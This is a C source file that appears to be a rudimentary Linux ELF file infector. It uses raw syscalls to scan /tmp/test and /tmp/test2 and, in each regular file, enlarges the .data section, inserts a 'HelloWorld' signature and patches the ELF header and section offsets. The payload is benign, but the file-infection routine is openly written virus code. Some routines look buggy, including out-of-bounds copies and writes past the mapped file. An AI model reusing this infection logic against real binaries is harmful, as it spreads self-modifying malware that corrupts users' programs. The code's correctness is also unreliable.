#define _FCNTL_H
#include <linux/stat.h>
#include <stddef.h>
#include <sys/types.h>
#include <bits/stat.h>
#include <bits/fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <dirent.h>
#include <elf.h>

#define BUF_SIZE 1024

typedef off_t off64_t;
typedef ino_t ino64_t;

struct  linux_dirent {
  unsigned long         d_ino;
  unsigned long         d_off;
  unsigned short  d_reclen;
  char            d_name[];
};

static int  write(int fd, const void *buf, size_t count) {
  register int8_t     rax asm("rax") = 1;
  register int        rdi asm("rdi") = fd;
  register const void *rsi asm("rsi") = buf;
  register size_t     rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}


static int  open(const char *pathname, int flags, int mode) {
  register int8_t     rax asm("rax") = 2;
  register const char *rdi asm("rdi") = pathname;
  register int        rsi asm("rsi") = flags;
  register int        rdx asm("rdx") = mode;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  close(int fd) {
  register int8_t       rax asm("rax") = 3;
  register unsigned int rdi asm("rdi") = fd;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  stat(const char *filename, struct stat *statbuf) {
  register int8_t       rax asm("rax") = 4;
  register const char   *rdi asm("rdi") = filename;
  register struct stat  *rsi asm("rsi") = statbuf;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off) {
  register void         *ret asm("rax");
  register int8_t       rax asm("rax") = 9;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;
  register int    rdx asm("rdx") = prot;
  register int    r10 asm("r10") = flags;
  register int    r8 asm("r8") = fildes;
  register off_t  r9 asm("r9") = off;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static int  munmap(void *addr, size_t len) {
  register int8_t       rax asm("rax") = 11;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
  register int8_t                 rax asm("rax") = 78;
  register unsigned int           rdi asm("rdi") = fd;
  register struct linux_dirent  *rsi asm("rsi") = dirp;
  register unsigned int           rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *memcpy(void *dest, const void *src, size_t n) {
  while (n > 0) {
    ((char *)dest)[n] = ((char *)src)[n];
    n -= 1;
  }
  ((char *)dest)[0] = ((char *)src)[0];
  return (dest);
}

static char *strcat(char *dest, const char *src) {
  int i;
  int j;

  i = 0;
  while (dest[i])
    i += 1;
  j = 0;
  while (src[j]) {
    dest[i] = src[j];
    i += 1;
    j += 1;
  }
  dest[i] = '\0';
  return (dest);
}

static size_t strlen(const char *s) {
  size_t  i;

  i = 0;
  while (s[i])
    i += 1;
  return (i);
}

static int strcmp(const char *s1, const char *s2) {
  size_t  i;

  i = 0;
  while (s1[i] && s2[i]) {
    if (s1[i] != s2[i])
      return (s1[i] - s2[i]);
    i += 1;
  }
  return (s1[i] - s2[i]);
}

static void  *memmove(void *dest, const void *src, size_t n) {
  size_t  i;

  i = 0;
  if (src >= dest)
    memcpy(dest, src, n);
  else {
    i += n - 1;
    while (n > 0) {
      ((char *)dest)[i] = ((char *)src)[i];
      n -= 1;
      i -= 1;
    }
  }
  return (dest);
}

/* static DIR *opendir(const char *name) { */

/* } */

/* static struct dirent  *readdir(DIR *dirp) { */

/* } */

/* static int  closedir(DIR *dirp) { */

/* } */

#include <sys/mman.h>

struct bfile {
  int         fd;
  off_t       size;
  Elf64_Ehdr  *header;
};

#include <string.h>

static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
  int         fd;
  size_t      len;
  char        *tmp;
  char        slash[] = "/";
  struct stat stats;

  len = strlen(dirname) + strlen(filename) + 2;
  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
    return (-1);
  memcpy(tmp, dirname, strlen(dirname));
  strcat(tmp, slash);
  strcat(tmp, filename);
  if (stat(tmp, &stats) < 0) {
    munmap(tmp, len);
    return (-1);
  }
  if (!S_ISREG(stats.st_mode)) {
    munmap(tmp, len);
    return (1);
  }
  if ((fd = open(tmp, O_RDWR, 0)) <= 0) {
    munmap(tmp, len);
    return (-1);
  }
  if ((bin->header = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    munmap(tmp, len);
    return (-1);
  }
  munmap(tmp, len);
  bin->fd = fd;
  bin->size = stats.st_size;
  return (0);
}

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry > offset)
      header->e_entry += toAdd;
    if (header->e_phoff > offset)
      header->e_phoff += toAdd;
    if (header->e_shoff > offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset > offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset > offset)
            program->p_offset += toAdd;
        if (program->p_paddr > offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;
  char        dataName[] = ".data";

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
    pointer += 1;
  return (pointer);
}

char payload[] = "HelloWorld";

static int  appendSignature(struct bfile file, size_t offset) {
  size_t  toAdd;

  toAdd = strlen(payload) + 1;
  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
  memcpy(((void *)file.header) + offset, payload, toAdd);
  return (0);
}

static void  infectFile(struct bfile bin) {
  size_t      len;
  Elf64_Shdr  *data;
  Elf64_Off   offset;

  len = strlen(payload);
  data = getDataSectionHeader(bin.header);
  data->sh_size += len + 1;
  offset = data->sh_offset;
  appendSignature(bin, offset + data->sh_size - (len + 1));
  bin.size += len + 1;
  updateOffsets(bin.header, offset + data->sh_size - len - 1, len + 1);
  write(bin.fd, bin.header, bin.size);
  close(bin.fd);
  munmap(bin.header, bin.size);
}

static int  infectBins(const char *dirname) {
  int                   fd;
  int                   ret;
  struct bfile          bin;
  int                   bpos;
  int                   nread;
  struct linux_dirent   *dirp;
  char                  buf[BUF_SIZE];
  char                  d_type;

  if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
    return (-1);
  if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
    return (-1);
  bpos = 0;
  while (bpos < nread) {
    dirp = (struct linux_dirent *) (buf + bpos);
    if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
      return (-1);
    if (ret == 0)
      infectFile(bin);
    bpos += dirp->d_reclen;
  }
  close(fd);
  return (0);
}

int   main(void) {
  size_t  i;
  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};

  i = 0;
  while (infectDir[i] != NULL) {
    if (infectBins(infectDir[i]) == -1)
      return (1);
    i += 1;
  }
  return (0);
}
